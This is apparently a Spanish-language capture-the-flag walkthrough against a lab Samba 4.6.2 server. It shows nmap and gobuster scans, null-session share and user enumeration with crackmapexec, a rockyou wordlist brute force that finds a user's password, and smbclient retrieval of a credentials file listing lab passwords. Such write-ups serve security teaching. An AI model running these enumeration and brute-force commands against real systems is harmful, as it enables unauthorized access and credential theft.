# Version Samba smbd 4.6.2
<p> Una version de Samba 4.6.2 en donde se intenta acceder a los datos no asegurado correctamente en el servicio. </p>

## Recursos
- Nmap
- Crackmapexe
- gobuster

## Camino a seguir

<p> Escaneo de la red con NMAP</p>

```
Nmap scan report for 172.17.0.2
Host is up (0.0000070s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:a1:09:2d:be:05:58:1b:01:20:d7:d0:d8:0d:7b:a6 (ECDSA)
|_  256 cd:98:0b:8a:0b:f9:f5:43:e4:44:5d:33:2f:08:2e:ce (ED25519)
80/tcp  open  http        Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Login
|_http-server-header: Apache/2.4.58 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: SAMBASERVER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2025-02-04T21:01:47
|_  start_date: N/A

```

<p>Puertos 22, 80, 139, 445 abiertos, Ahora escaneo de directorios http en puerto 80</p>

```
gobuster dir -u 172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x php,html,txt

```

<p>Resultado del escaneo:</p>

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/info.php             (Status: 200) [Size: 72705]
/index.php            (Status: 200) [Size: 3543]
/productos.php        (Status: 200) [Size: 5229]
Progress: 566832 / 566836 (100.00%)
===============================================================
Finished
===============================================================

```

<p>Ahora veamos si hay recursos compartido dentro del servicio de SAMBA</p>

```
crackmapexec smb 172.17.0.2 -u '' -p '' --shares

```

<p>Resultado del escaneo de recursos compartido en SAMBA:</p>

```
SMB         172.17.0.2      445    SAMBASERVER      [*] Windows 6.1 Build 0 (name:SAMBASERVER) (domain:SAMBASERVER) (signing:False) (SMBv1:False)
SMB         172.17.0.2      445    SAMBASERVER      [+] SAMBASERVER\: 
SMB         172.17.0.2      445    SAMBASERVER      [+] Enumerated shares
SMB         172.17.0.2      445    SAMBASERVER      Share           Permissions     Remark
SMB         172.17.0.2      445    SAMBASERVER      -----           -----------     ------
SMB         172.17.0.2      445    SAMBASERVER      myshare         READ            Carpeta compartida sin restricciones                                                                                
SMB         172.17.0.2      445    SAMBASERVER      backup24                        Privado
SMB         172.17.0.2      445    SAMBASERVER      home                            Produccion
SMB         172.17.0.2      445    SAMBASERVER      IPC$                            IPC Service (EseEmeB Samba Server)

```

<p>Ahora veamos si tenemos usuarios</p>

```
crackmapexec smb 172.17.0.2 -u '' -p '' --users

```

<p>Resultados:</p>

```
SMB         172.17.0.2      445    SAMBASERVER      [*] Windows 6.1 Build 0 (name:SAMBASERVER) (domain:SAMBASERVER) (signing:False) (SMBv1:False)
SMB         172.17.0.2      445    SAMBASERVER      [+] SAMBASERVER\: 
SMB         172.17.0.2      445    SAMBASERVER      [-] Error enumerating domain users using dc ip 172.17.0.2: socket connection error while opening: [Errno 111] Connection refused
SMB         172.17.0.2      445    SAMBASERVER      [*] Trying with SAMRPC protocol
SMB         172.17.0.2      445    SAMBASERVER      [+] Enumerated domain user(s)
SMB         172.17.0.2      445    SAMBASERVER      SAMBASERVER\usuario1                       
SMB         172.17.0.2      445    SAMBASERVER      SAMBASERVER\usuario3                       
SMB         172.17.0.2      445    SAMBASERVER      SAMBASERVER\administrador                  
SMB         172.17.0.2      445    SAMBASERVER      SAMBASERVER\usuario2                       
SMB         172.17.0.2      445    SAMBASERVER      SAMBASERVER\satriani7                      
SMB         172.17.0.2      445    SAMBASERVER      [+] Enumerated domain user(s)
SMB         172.17.0.2      445    SAMBASERVER      SAMBASERVER\usuario1                       
SMB         172.17.0.2      445    SAMBASERVER      SAMBASERVER\usuario3                       
SMB         172.17.0.2      445    SAMBASERVER      SAMBASERVER\administrador                  
SMB         172.17.0.2      445    SAMBASERVER      SAMBASERVER\usuario2                       
SMB         172.17.0.2      445    SAMBASERVER      SAMBASERVER\satriani7

```

<p>Existen varios usuarios y nos interesa el usuario "satriani7", usaremos fuerza bruta con su usuario</p>

```
crackmapexec smb 172.17.0.2 -u 'satriani7' -p '../../rockyou.txt' 

```

<p>Obtenemos el siguiente resultado, siendo la contraseña "50cent"</p>

```
SMB         172.17.0.2      445    SAMBASERVER      [-] SAMBASERVER\satriani7:0123456789 STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    SAMBASERVER      [-] SAMBASERVER\satriani7:school STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    SAMBASERVER      [-] SAMBASERVER\satriani7:barcelona STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    SAMBASERVER      [-] SAMBASERVER\satriani7:august STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    SAMBASERVER      [-] SAMBASERVER\satriani7:orlando STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    SAMBASERVER      [-] SAMBASERVER\satriani7:samuel STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    SAMBASERVER      [-] SAMBASERVER\satriani7:cameron STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    SAMBASERVER      [-] SAMBASERVER\satriani7:slipknot STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    SAMBASERVER      [-] SAMBASERVER\satriani7:cutiepie STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    SAMBASERVER      [-] SAMBASERVER\satriani7:monkey1 STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    SAMBASERVER      [+] SAMBASERVER\satriani7:50cent

```

<p>Ahora accedemos con el usuario y contraseña de satriani7 para observar en que recursos tiene permisos</p>

```
crackmapexec smb 172.17.0.2 -u 'satriani7' -p '50cent' --shares

```

```
SMB         172.17.0.2      445    SAMBASERVER      [*] Windows 6.1 Build 0 (name:SAMBASERVER) (domain:SAMBASERVER) (signing:False) (SMBv1:False)
SMB         172.17.0.2      445    SAMBASERVER      [+] SAMBASERVER\satriani7:50cent 
SMB         172.17.0.2      445    SAMBASERVER      [+] Enumerated shares
SMB         172.17.0.2      445    SAMBASERVER      Share           Permissions     Remark
SMB         172.17.0.2      445    SAMBASERVER      -----           -----------     ------
SMB         172.17.0.2      445    SAMBASERVER      myshare         READ            Carpeta compartida sin restricciones
SMB         172.17.0.2      445    SAMBASERVER      backup24        READ            Privado
SMB         172.17.0.2      445    SAMBASERVER      home                            Produccion
SMB         172.17.0.2      445    SAMBASERVER      IPC$                            IPC Service (EseEmeB Samba Server)

```

<p>Tiene permiso de lectura en el recurso de "backup24", nos lo descargamos para ver que contiene pero antes nos conectamos con su usuario y contraseña, posteriormente miramos el contenido con ls</p>

```
smbclient //172.17.0.2/backup24 -U satriani7

```

```
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Oct  6 03:19:03 2024
  ..                                  D        0  Sun Oct  6 03:19:03 2024
  Desktop                             D        0  Sun Oct  6 03:18:46 2024
  CQFO6Q~M                            D        0  Sun Oct  6 03:19:03 2024
  Downloads                           D        0  Sun Oct  6 03:15:03 2024
  Temp                                D        0  Sun Oct  6 03:18:51 2024
  Videos                              D        0  Sun Oct  6 03:15:03 2024
  Pictures                            D        0  Sun Oct  6 03:15:03 2024
  Documents                           D        0  Sun Oct  6 03:15:03 2024

                82083148 blocks of size 1024. 50315112 blocks available

```

<p>Ahora vamos a la carpeta "Personal" ubicada en "Documents" y descargamos los ficheros "notes.txt" y "credentials.txt"</p>

```
smb: \> cd Documents
smb: \Documents\> ls
  .                                   D        0  Sun Oct  6 03:15:03 2024
  ..                                  D        0  Sun Oct  6 03:19:03 2024
  Personal                            D        0  Sun Oct  6 03:17:17 2024
  Work                                D        0  Sun Oct  6 03:15:06 2024

                82083148 blocks of size 1024. 50314872 blocks available
smb: \Documents\> cd Personal
smb: \Documents\Personal\> ls
  .                                   D        0  Sun Oct  6 03:17:17 2024
  ..                                  D        0  Sun Oct  6 03:15:03 2024
  notes.txt                           N       15  Sun Oct  6 03:19:57 2024
  credentials.txt                     N      902  Sun Oct  6 03:23:29 2024

                82083148 blocks of size 1024. 50314872 blocks available

```

```
smb: \Documents\Personal\> get credentials.txt

```

```
smb: \Documents\Personal\> get notes.txt

```

<p> Encontramos el usuario y contraseña del Administrador dentro de credentials.txt</p>

```
A# Archivo de credenciales

Este documento expone credenciales de usuarios, incluyendo la del usuario administrador.

Usuarios:
-------------------------------------------------
1. Usuario: jsmith
   - Contraseña: PassJsmith2024!

2. Usuario: abrown
   - Contraseña: PassAbrown2024!

3. Usuario: lgarcia
   - Contraseña: PassLgarcia2024!

4. Usuario: kchen
   - Contraseña: PassKchen2024!

5. Usuario: tjohnson
   - Contraseña: PassTjohnson2024!

6. Usuario: emiller
   - Contraseña: PassEmiller2024!

7. Usuario: administrador
    - Contraseña: Adm1nP4ss2024

8. Usuario: dwhite
   - Contraseña: PassDwhite2024!

9. Usuario: nlewis
   - Contraseña: PassNlewis2024!

10. Usuario: srodriguez
   - Contraseña: PassSrodriguez2024!



# Notas:
- Mantener estas credenciales en un lugar seguro.
- Cambiar las contraseñas periódicamente.
- No compartir estas credenciales sin autorización.

```
